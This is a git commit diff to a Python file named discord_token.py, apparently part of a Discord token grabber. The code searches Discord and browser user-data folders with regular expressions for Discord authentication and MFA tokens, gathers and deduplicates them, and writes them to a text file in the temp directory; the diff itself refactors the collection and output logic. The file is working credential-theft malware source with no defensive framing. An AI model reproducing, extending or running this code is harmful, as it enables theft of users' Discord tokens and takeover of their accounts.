54c66661d8315abe439eab69d2550f6179f7214e
UnrealNoodle <135469960+UnrealNoodle@users.noreply.github.com>
2023-06-24 13:12:22 +0400

    Add files via upload

--- discord_token.py
+++ discord_token.py
@@ -15,7 +15,8 @@ def find_tokens(path):
         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
             for regex in (r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}', r'mfa\.[\w-]{84}'):
                 for token in re.findall(regex, line):
-                    tokens.append(token)
+                    if token not in tokens:  # Check for duplicates
+                        tokens.append(token)
     return tokens
 
 def main():
@@ -32,23 +33,24 @@ def main():
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
     }
 
-    output = ''
+    tokens = []
 
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
 
-        output += f'\n**Discord Token**\n```\n'
+        tokens.extend(find_tokens(path))
 
-        tokens = find_tokens(path)
+    tokens = list(set(tokens))  # Remove duplicates
 
-        if len(tokens) > 0:
-            for token in tokens:
-                output += f'{token}\n'
-        else:
-            output += 'No tokens found.\n'
-
+    output = ''
+    if len(tokens) > 0:
+        output += '**Discord Tokens**:\n```\n'
+        for token in tokens:
+            output += f'{token}\n'
         output += '```'
+    else:
+        output += 'No tokens found.'
 
     temp_folder = tempfile.gettempdir()
     output_file = os.path.join(temp_folder, 'discord_token.txt')
